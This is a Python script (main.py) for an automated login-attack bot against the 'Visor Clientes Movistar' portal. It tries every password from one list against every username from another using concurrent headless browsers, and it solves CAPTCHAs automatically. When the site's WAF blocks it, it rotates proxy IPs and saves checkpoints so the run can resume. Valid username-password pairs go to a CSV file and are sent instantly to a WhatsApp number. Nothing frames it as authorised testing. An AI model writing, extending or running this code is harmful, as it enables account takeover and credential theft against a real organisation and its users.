#!/usr/bin/env python3
"""
Módulo de Validación de Login - Visor Clientes Movistar (main.py)
"""

import sys, os, csv, time, logging, json, threading
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIGURACIÓN DE RUTAS
# ============================================================
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

from login_automation import LoginAutomation
from captcha_resolver import CaptchaResolver
from proxy_config import SUPERPROXY_CONFIG, get_proxy_config, generate_session_id
from whatsapp_notifier import (
    notificar_login_exitoso,
    notificar_resumen,
    notificar_error_critico,
    esta_configurado,
    obtener_numero_destino
)
from state_manager import guardar_checkpoint, limpiar_checkpoint


DATA_DIR = PROJECT_DIR / "data"
SCREENSHOT_DIR = PROJECT_DIR / "screenshots"
LOGS_DIR = PROJECT_DIR / "logs"
ARCHIVO_USUARIOS = DATA_DIR / "usuarios.csv"
ARCHIVO_CONTRASENAS = DATA_DIR / "contraseñas.csv"
RESULTADOS_FILE = PROJECT_DIR / "resultados.json"
DEFAULT_THREADS = 5

# Crear directorios
LOGS_DIR.mkdir(parents=True, exist_ok=True)
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# LOGGING
# ============================================================
log_file = LOGS_DIR / f"run_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

_print_lock = threading.Lock()
_results_lock = threading.Lock()
counters = {"total": 0, "ok": 0, "fail": 0, "waf": 0, "rotations": 0}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-5s] [%(threadName)-12s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(log_file), encoding="utf-8")
    ]
)
logger = logging.getLogger("Bot")


def sp(msg):
    """Safe print con lock."""
    with _print_lock:
        print(msg, flush=True)


def load_csv(fp):
    """Carga un archivo CSV con una columna."""
    if not fp.exists():
        return []
    vals = []
    with open(fp, "r", encoding="utf-8-sig") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                vals.append(line)
    return vals


# ============================================================
# WORKER: UN LOGIN POR HILO
# ============================================================

def worker(task, proxy_cfg, headless, captcha_res):
    """
    Ejecuta UN login en su propio navegador/hilo.
    """
    automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
    result = {
        "usuario": task["u"],
        "contrasena": task["p"],
        "procedencia": task["t"],
        "timestamp": datetime.now().isoformat(),
        "exito": False,
        "waf_blocked": False,
        "is_blank": False,
        "is_timeout": False,
        "error": "",
        "screenshot": "",
        "ip": task.get("ip", ""),
    }
    try:
        automation.start_browser(proxy_config=proxy_cfg)
        lr = automation.attempt_login(
            usuario=task["u"],
            contraseña=task["p"],
            procedencia=task["t"],
            captcha_resolver=captcha_res.resolve if captcha_res else None,
        )
        result.update({
            "exito": lr.get("exito", False),
            "error": lr.get("error", ""),
            "screenshot": lr.get("screenshot", ""),
            "waf_blocked": lr.get("waf_blocked", False),
        })

        # Diagnóstico para errores críticos
        err_lower = (result["error"] or "").lower()
        if "blanco" in err_lower or "no se pudo cargar la página" in err_lower or "chrome-error" in err_lower:
            result["is_blank"] = True
        if "timeout" in err_lower or "demora" in err_lower or "timed out" in err_lower:
            result["is_timeout"] = True

    except Exception as e:
        err_str = str(e)
        result["error"] = err_str
        err_l = err_str.lower()
        if "timeout" in err_l:
            result["is_timeout"] = True
        if "blank" in err_l or "about:blank" in err_l or "chrome-error" in err_l:
            result["is_blank"] = True
    finally:
        automation.close_browser()

    with _results_lock:
        counters["total"] += 1

    return result


# ============================================================
# EJECUCIÓN DE BATCH
# ============================================================

def run_batch(tasks_batch, proxy_cfg, num_threads, headless, captcha_res, batch_num, usar_whatsapp=True):
    """
    Ejecuta un batch de logins concurrentes.
    """
    session_id = proxy_cfg["session_id"] if proxy_cfg else f"local_{int(time.time())}"
    ip_label = proxy_cfg["ip"] if proxy_cfg else "Local-IP"

    for t in tasks_batch:
        t["ip"] = ip_label

    sp(f"\n{'='*60}")
    sp(f"  BATCH #{batch_num} | {len(tasks_batch)} tareas | {num_threads} hilos")
    sp(f"  IP: {ip_label} (session: {session_id[:12]}...)")
    sp(f"{'='*60}")

    results = []
    waf_detected = False

    csv_lock = threading.Lock()
    file_correcto = DATA_DIR / "login_correcto.csv"
    file_incorrecto = DATA_DIR / "login_incorrecto.csv"

    # Inicializar archivos con cabecera si no existen
    for f_path in (file_correcto, file_incorrecto):
        f_path.parent.mkdir(parents=True, exist_ok=True)
        if not f_path.exists():
            with open(f_path, "w", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])

    with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix=f"IP-{session_id[:6]}") as ex:
        futs = {ex.submit(worker, t, proxy_cfg, headless, captcha_res): t for t in tasks_batch}
        for fut in as_completed(futs, timeout=300):
            try:
                r = fut.result(timeout=300)
                results.append(r)
                
                # Clasificar e interactuar en CSV en runtime
                if r["waf_blocked"]:
                    waf_detected = True
                    with _results_lock:
                        counters["waf"] += 1
                        counters["fail"] += 1
                    sp(f"  [WAF] {r['procedencia']}/{r['usuario']} -> ROTANDO IP")
                elif r["exito"]:
                    with _results_lock:
                        counters["ok"] += 1
                    sp(f"  [OK]  {r['procedencia']}/{r['usuario']}")
                    
                    # Escribir en login_correcto.csv
                    with csv_lock:
                        with open(file_correcto, "a", encoding="utf-8", newline="") as f:
                            writer = csv.writer(f)
                            writer.writerow([
                                datetime.now().isoformat(), r["procedencia"], 
                                r["usuario"], r["contrasena"], r["ip"], ""
                            ])
                            
                    # Enviar alerta de login exitoso por WhatsApp inmediatamente
                    if usar_whatsapp and esta_configurado():
                        sp(f"  📲 Enviando alerta instantánea por WhatsApp (+{obtener_numero_destino()})...")
                        threading.Thread(
                            target=notificar_login_exitoso,
                            kwargs={
                                "usuario": r["usuario"],
                                "contrasena": r["contrasena"],
                                "portal": "Visor Clientes Movistar",
                                "procedencia": r["procedencia"],
                                "ip": ip_label,
                                "screenshot_path": r.get("screenshot")
                            },
                            daemon=True
                        ).start()
                else:
                    with _results_lock:
                        counters["fail"] += 1
                    err_desc = r.get("error", "")
                    sp(f"  [X]   {r['procedencia']}/{r['usuario']} -> {err_desc[:50]}")
                    
                    # Escribir en login_incorrecto.csv
                    with csv_lock:
                        with open(file_incorrecto, "a", encoding="utf-8", newline="") as f:
                            writer = csv.writer(f)
                            writer.writerow([
                                datetime.now().isoformat(), r["procedencia"], 
                                r["usuario"], r["contrasena"], r["ip"], err_desc
                            ])
                    
            except Exception as e:
                sp(f"  [ERR] -> {e}")

    return results, waf_detected


# ============================================================
# FUNCIÓN PRINCIPAL CON SOPORTE DE CHECKPOINTS Y ERRORES CRÍTICOS
# ============================================================

def main(checkpoint_data=None):
    print("""
============================================================
    """)
    start_time = datetime.now()
    all_results = []

    # 1. CARGAR ARCHIVOS / TAREAS
    if checkpoint_data:
        print(f"🔄 Reanudando sesión guardada desde tarea {checkpoint_data.get('task_idx', 0)}/{checkpoint_data.get('total_tasks', 0)}...")
        all_tasks = checkpoint_data.get("all_tasks", [])
        task_idx = checkpoint_data.get("task_idx", 0)
        saved_cfg = checkpoint_data.get("config", {})
        usar_proxy = saved_cfg.get("usar_proxy", True)
        num_threads = saved_cfg.get("num_threads", DEFAULT_THREADS)
        headless = saved_cfg.get("headless", True)
        usar_whatsapp = saved_cfg.get("usar_whatsapp", esta_configurado())
        if "stats" in checkpoint_data:
            counters.update(checkpoint_data["stats"])
    else:
        usuarios = load_csv(ARCHIVO_USUARIOS)
        contrasenas = load_csv(ARCHIVO_CONTRASENAS)
        
        if not usuarios or not contrasenas:
            print("❌ No hay usuarios o contraseñas en data/.")
            print(f"   Usuarios: {ARCHIVO_USUARIOS}")
            print(f"   Contraseñas: {ARCHIVO_CONTRASENAS}")
            sys.exit(1)

        # 1.1 CONFIGURAR PROCEDENCIA

        print("\nSeleccione la procedencia a trabajar:")
        print("  1. Usuario Interno")
        print("  2. Usuario Externo")
        print("  3. Ambos (Interno y Externo)")
        op_proc = input("Opción [1-3, default=3]: ").strip()

        if op_proc == "1":
            procedencias = ["interno"]
            proc_label = "Solo Interno"
        elif op_proc == "2":
            procedencias = ["externo"]
            proc_label = "Solo Externo"
        else:
            procedencias = ["interno", "externo"]
            proc_label = "Ambos (Interno y Externo)"

        # Generar tareas con el nuevo algoritmo:
        # for each Procedencia C:
        #   for each Contraseña B:
        #     for each Usuario A:
        all_tasks = []
        for t in procedencias:
            for c in contrasenas:
                for u in usuarios:
                    all_tasks.append({"u": u, "p": c, "t": t})

        task_idx = 0
        print(f"\n  Procedencia: {proc_label}")
        print(f"  Usuarios: {len(usuarios)} | Contraseñas: {len(contrasenas)} | Total Tareas: {len(all_tasks)}")

        # 2. CONFIGURAR PROXY
        pr = input("\n¿Desea utilizar proxy? (s/n, default=s): ").strip().lower()
        usar_proxy = pr != "n"
        print(f"  Usar proxy: {'SI' if usar_proxy else 'NO (IP Local)'}")


        # 3. CONFIGURAR HILOS POR IP / BATCH
        th = input(f"\nHilos por IP (recomendado 5-10, default={DEFAULT_THREADS}): ").strip()
        num_threads = int(th) if th.isdigit() and int(th) > 0 else DEFAULT_THREADS
        num_threads = min(num_threads, 50)
        print(f"  Hilos por IP: {num_threads}")

        # 4. CONFIGURAR HEADLESS
        hl = input("Headless? (s/n, default=s): ").strip().lower()
        headless = hl != "n"
        print(f"  Headless: {headless}")

        # 5. CONFIGURAR WHATSAPP
        if esta_configurado():
            wa_in = input(f"\n¿Desea activar notificaciones por WhatsApp a +{obtener_numero_destino()}? (s/n, default=s): ").strip().lower()
            usar_whatsapp = wa_in != "n"
        else:
            wa_in = input("\nWhatsApp no configurado. ¿Desea configurarlo ahora? (s/n, default=n): ").strip().lower()
            if wa_in == "s":
                import configurarwhatsapp
                configurarwhatsapp.configurar_whatsapp()
                usar_whatsapp = esta_configurado()
            else:
                usar_whatsapp = False
        print(f"  WhatsApp: {'ACTIVO (+'+str(obtener_numero_destino())+')' if (usar_whatsapp and esta_configurado()) else 'DESACTIVADO'}")

    # CONFIGURAR CAPTCHA (Resolución local instantánea con ddddocr)
    captcha_res = CaptchaResolver(method="ddddocr")

    # CONFIRMAR
    print(f"\n{'='*50}")
    print(f"  Tareas totales: {len(all_tasks)} | Pendientes: {len(all_tasks) - task_idx} | Hilos: {num_threads}")
    if usar_proxy:
        print(f"  Proxy: SUPERPROXY - País: {SUPERPROXY_CONFIG['country'].upper()} (Rotativo)")
    else:
        print("  Proxy: DESACTIVADO (Se usará la IP local directa)")
    print(f"  Headless: {headless} | WhatsApp Notifier: {'ACTIVO (+'+str(obtener_numero_destino())+')' if (usar_whatsapp and esta_configurado()) else 'DESACTIVADO'}")
    print(f"{'='*50}")
    
    if not checkpoint_data and input("Iniciar? (s/n, default=s): ").strip().lower() == "n":
        sys.exit(0)

    # EJECUCIÓN
    sp(f"\n{'*'*50} INICIANDO {'*'*50}")

    batch_num = 0
    consecutive_waf_count = 0
    consecutive_blank_count = 0
    consecutive_timeout_count = 0

    try:
        while task_idx < len(all_tasks):
            batch_num += 1
            if usar_proxy:
                proxy_cfg = get_proxy_config()
                sp(f"\n🔄 NUEVA IP PROXY: {proxy_cfg['ip']} (batch #{batch_num})")
            else:
                proxy_cfg = None
                sp(f"\n🔄 EJECUTANDO CON IP LOCAL (batch #{batch_num})")
            
            # Tomar batch de tareas
            batch = all_tasks[task_idx:task_idx + num_threads]
            
            # Ejecutar batch
            batch_results, waf = run_batch(
                batch, proxy_cfg, num_threads, headless, 
                captcha_res, batch_num, usar_whatsapp=usar_whatsapp
            )
            all_results.extend(batch_results)

            
            # Evaluar errores críticos en el batch
            batch_wafs = sum(1 for r in batch_results if r.get("waf_blocked"))
            batch_blanks = sum(1 for r in batch_results if r.get("is_blank"))
            batch_timeouts = sum(1 for r in batch_results if r.get("is_timeout"))

            if batch_wafs > 0:
                consecutive_waf_count += batch_wafs
                with _results_lock:
                    counters["rotations"] += 1
                sp(f"  ⚠️ WAF DETECTADO en batch #{batch_num}. Rotando IP...")
            else:
                consecutive_waf_count = 0

            if batch_blanks > 0:
                consecutive_blank_count += batch_blanks
            else:
                consecutive_blank_count = 0

            if batch_timeouts > 0:
                consecutive_timeout_count += batch_timeouts
            else:
                consecutive_timeout_count = 0

            # Avanzar el índice de tareas procesadas
            task_idx += len(batch)

            # ============================================================
            # DETECCIÓN DE ERRORES CRÍTICOS (2 OCURRENCIAS SEGUIDAS)
            # ============================================================
            error_critico_motivo = None
            error_critico_detalle = None

            if consecutive_waf_count >= 2:
                error_critico_motivo = "2 Bloqueos WAF Consecutivos"
                error_critico_detalle = f"Se detectaron {consecutive_waf_count} bloqueos WAF en pruebas sucesivas."
            elif consecutive_blank_count >= 2:
                error_critico_motivo = "2 Pantallas en Blanco Consecutivas"
                error_critico_detalle = f"La página de Movistar quedó en blanco en {consecutive_blank_count} intentos consecutivos."
            elif consecutive_timeout_count >= 2:
                error_critico_motivo = "2 Demoras Excesivas / Timeouts Consecutivos"
                error_critico_detalle = f"Se registraron {consecutive_timeout_count} timeouts seguidos al cargar la página."

            if error_critico_motivo:
                sp(f"\n🚨 ERROR CRÍTICO DETECTADO: {error_critico_motivo}")
                sp(f"   Detalle: {error_critico_detalle}")
                sp("💾 Guardando checkpoint del estado actual y pausando ejecución...")

                ultimo_fallo = batch_results[-1] if batch_results else None

                # Notificar a WhatsApp
                if esta_configurado():
                    notificar_error_critico(
                        portal="Visor Clientes Movistar",
                        motivo=error_critico_motivo,
                        detalle=error_critico_detalle,
                        tarea_actual=ultimo_fallo,
                        tareas_restantes=len(all_tasks) - task_idx
                    )

                # Guardar Checkpoint
                guardar_checkpoint(
                    portal="Visor Clientes Movistar",
                    script="main.py",
                    task_idx=task_idx,
                    all_tasks=all_tasks,
                    stats=counters,
                    config={"num_threads": num_threads, "usar_proxy": usar_proxy, "headless": headless},
                    motivo=error_critico_motivo,
                    ultimo_error=error_critico_detalle
                )

                sp("\n⏸️ EJECUCIÓN PAUSADA. Puede reanudarla ejecutando: python ejecutar.py\n")
                return

            time.sleep(2)  # Pausa entre batches

    except KeyboardInterrupt:
        sp("\n⏹️ Interrumpido por el usuario. Guardando estado...")
        guardar_checkpoint(
            portal="Visor Clientes Movistar",
            script="main.py",
            task_idx=task_idx,
            all_tasks=all_tasks,
            stats=counters,
            config={"num_threads": num_threads, "usar_proxy": usar_proxy, "headless": headless},
            motivo="Interrupción manual del usuario",
            ultimo_error=""
        )
        return
    except Exception as e:
        logger.error(f"Error fatal: {e}", exc_info=True)
        guardar_checkpoint(
            portal="Visor Clientes Movistar",
            script="main.py",
            task_idx=task_idx,
            all_tasks=all_tasks,
            stats=counters,
            config={"num_threads": num_threads, "usar_proxy": usar_proxy, "headless": headless},
            motivo=f"Excepción no controlada: {str(e)[:100]}",
            ultimo_error=str(e)
        )
        return

    # 8. GUARDAR RESULTADOS AL COMPLETAR TODAS LAS TAREAS
    end = datetime.now()
    dur = str(end - start_time).split(".")[0]

    RESULTADOS_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(RESULTADOS_FILE, "w", encoding="utf-8") as f:
        json.dump({
            "fecha": start_time.isoformat(),
            "duracion": dur,
            "total": counters["total"],
            "exitosos": counters["ok"],
            "fallidos": counters["fail"],
            "waf_blocks": counters["waf"],
            "rotaciones": counters["rotations"],
            "proxy": SUPERPROXY_CONFIG if usar_proxy else None,
            "resultados": all_results,
        }, f, ensure_ascii=False, indent=2)

    # Limpiar checkpoint porque completó 100%
    limpiar_checkpoint()

    # 9. RESUMEN FINAL
    sp(f"\n{'='*50} RESUMEN FINAL {'='*50}")
    sp(f"  Total:     {counters['total']}")
    sp(f"  Exitosos:  {counters['ok']}")
    sp(f"  Fallidos:  {counters['fail']}")
    sp(f"  WAF:       {counters['waf']}")
    sp(f"  Rotaciones: {counters['rotations']}")
    sp(f"  Duracion:  {dur}")
    sp(f"  Resultados: {RESULTADOS_FILE}")

    if counters["ok"] > 0:
        sp(f"\n✅ LOGINS EXITOSOS:")
        for r in all_results:
            if r.get("exito"):
                sp(f"  {r['procedencia']} // {r['usuario']} // {r['contrasena']} // IP: {r.get('ip','?')}")

    # 10. WHATSAPP RESUMEN
    if usar_whatsapp and esta_configurado():
        notificar_resumen(
            total=counters["total"],
            exitosos=counters["ok"],
            fallidos=counters["fail"],
            duracion=dur,
            portal="Visor Clientes Movistar"
        )
        sp("📲 Resumen enviado por WhatsApp.")


    sp("✅ Proceso completado exitosamente.")


if __name__ == "__main__":
    main()